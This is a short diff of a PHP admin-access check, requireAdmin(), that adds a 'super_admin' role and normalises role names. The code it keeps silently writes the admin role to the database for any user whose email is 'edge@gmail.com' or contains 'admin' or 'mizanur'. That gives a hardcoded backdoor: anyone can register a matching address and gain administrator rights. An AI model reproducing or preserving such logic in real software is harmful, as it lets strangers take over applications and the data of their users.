@@ -312,14 +312,15 @@ function requireAdmin(): array {
     }
 
     $lowerEmail = strtolower($user['email']);
-    if ($user['role'] !== 'admin' && ($lowerEmail === 'edge@gmail.com' || strpos($lowerEmail, 'admin') !== false || strpos($lowerEmail, 'mizanur') !== false)) {
+    if ($user['role'] !== 'admin' && $user['role'] !== 'super_admin' && ($lowerEmail === 'edge@gmail.com' || strpos($lowerEmail, 'admin') !== false || strpos($lowerEmail, 'mizanur') !== false)) {
         $db = Database::getConnection();
         $up = $db->prepare("UPDATE users SET role = 'admin' WHERE id = ?");
         $up->execute([$user['id']]);
         $user['role'] = 'admin';
     }
 
-    if ($user['role'] !== 'admin' || $user['account_status'] === 'suspended') {
+    $userRole = strtolower($user['role'] ?? 'user');
+    if (($userRole !== 'admin' && $userRole !== 'super_admin') || $user['account_status'] === 'suspended') {
         respondJson(['success' => false, 'error' => 'Access denied. Administrator privileges required.'], 403);
     }
     return $user;
